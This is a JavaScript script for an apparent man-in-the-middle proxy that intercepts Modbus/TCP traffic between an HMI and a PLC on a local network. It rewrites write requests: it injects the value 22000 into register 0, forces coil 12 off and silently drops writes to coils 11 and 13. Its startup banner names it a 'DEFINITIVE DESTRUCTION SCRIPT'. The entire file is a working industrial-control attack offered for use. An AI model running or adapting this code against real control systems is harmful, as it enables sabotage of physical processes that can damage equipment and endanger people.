function pad(n, width, z) {
  z = z || '0';
  n = n + '';
  return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
}

function onData(from, to, data) {
  if (data.length >= 12) {
    var functionCode = data[7];
    var time = new Date().toTimeString().split(' ')[0];

    // Function Code 6: Write Single Holding Register - Targeted Block & Inject
    if (functionCode == 6) {
      var regAddr = (data[8] << 8) | data[9];
      var regValue = (data[10] << 8) | data[11];
      var critical_registers = [0, 1, 2];

      if (critical_registers.includes(regAddr)) {
        log("╔═══[" + time + "]═══[CRITICAL REGISTER WRITE HIJACKED]═══╗");
        log("║ Direction: " + (from.indexOf(".11") !== -1 ? "HMI → PLC" : "PLC → HMI"));
        log("║ Original Target Address: " + regAddr);
        log("║ Original Value: " + regValue);
        log("╠════════════════════════════════════════════════════════════╣");
        log("║ [+] ACTION: Blocking write to critical registers [0, 1, 2].   ║");
        log("║ [+] ACTION: Injecting new write to address 0 with value 22000. ║");
        log("╚════════════════════════════════════════════════════════════╝");

        // Modify packet: Set address to 0, value to 22000 (0x55F0)
        data[8] = 0x00; data[9] = 0x00;
        data[10] = 0x55; data[11] = 0xF0;
        return data;
      } else {
        log("[" + time + "] Allowed register write to " + regAddr + " with value " + regValue);
      }
    }

    // Function Code 5: Write Single Coil - Multi-Target Attack
    else if (functionCode == 5) {
      var coilAddr = (data[8] << 8) | data[9];
      var coilValue = (data[10] << 8) | data[11];
      var blocked_coils = [11, 13];

      // Rule 1: If address is 12, force value to FALSE
      if (coilAddr === 12) {
        log("╔═══[" + time + "]═══[CRITICAL COIL WRITE INTERCEPTED]═══╗");
        log("║ Target Coil Address: " + coilAddr);
        log("║ Original Value: " + (coilValue == 0xFF00 ? "ON" : "OFF"));
        log("╠═══════════════════════════════════════════════════════════╣");
        log("║ [+] ACTION: Forcing coil value to FALSE (0x0000).          ║");
        log("╚═══════════════════════════════════════════════════════════╝");
        
        // Modify packet: Set coil value to FALSE
        data[10] = 0x00;
        data[11] = 0x00;
        return data; // Send the modified packet
      }
      // Rule 2: If address is 11 or 13, block the packet entirely
      else if (blocked_coils.includes(coilAddr)) {
        log("╔═══[" + time + "]═══[COIL WRITE BLOCKED]══════╗");
        log("║ Target Coil Address: " + coilAddr);
        log("║ Original Value: " + (coilValue == 0xFF00 ? "ON" : "OFF"));
        log("╠════════════════════════════════════════╣");
        log("║ [+] ACTION: Dropping packet.              ║");
        log("╚════════════════════════════════════════╝");
        
        return; // Return nothing to drop the packet
      }
      // Rule 3: For all other coils, allow
      else {
        log("[" + time + "] Allowed coil write to " + coilAddr);
      }
    }

    // Read operations are unchanged
    else if (functionCode == 3) {
      if (Math.random() < 0.01) {
        var startAddr = (data[8] << 8) | data[9];
        var quantity = (data[10] << 8) | data[11];
        log("[" + time + "] Read " + quantity + " registers from address " + startAddr);
      }
    }
    else if (functionCode == 1) {
      if (Math.random() < 0.01) {
        var startAddr = (data[8] << 8) | data[9];
        var quantity = (data[10] << 8) | data[11];
        log("[" + time + "] Read " + quantity + " coils from address " + startAddr);
      }
    }
  }

  // Return data unchanged for operations that weren't intercepted
  return data;
}

// Startup banner
log("");
log("╔════════════════════════════════════════════════════════════╗");
log("║         DEFINITIVE DESTRUCTION SCRIPT ACTIVE               ║");
log("╠════════════════════════════════════════════════════════════╣");
log("║ Configuration:                                             ║");
log("║                                                            ║");
log("║  [COIL ATTACK - FC5]                                       ║");
log("║  • IF write to coil 12 -> Force value to FALSE.            ║");
log("║  • IF write to coil 11 or 13 -> BLOCK packet.              ║");
log("║  • All other coil writes are ALLOWED.                      ║");
log("║                                                            ║");
log("║  [REGISTER ATTACK - FC6]                                   ║");
log("║  • IF write to registers [0, 1, 2] -> BLOCK & INJECT.      ║");
log("║  • INJECTION: Write 22000 to register 0.                   ║");
log("║  • All other register writes are ALLOWED.                  ║");
log("║                                                            ║");
log("╠════════════════════════════════════════════════════════════╣");
log("║ Target: 192.168.1.120 (PLC)                                ║");
log("║ Source: 192.168.1.11 (HMI)                                 ║");
log("╚════════════════════════════════════════════════════════════╝");
log("");
log("Monitoring Modbus traffic...");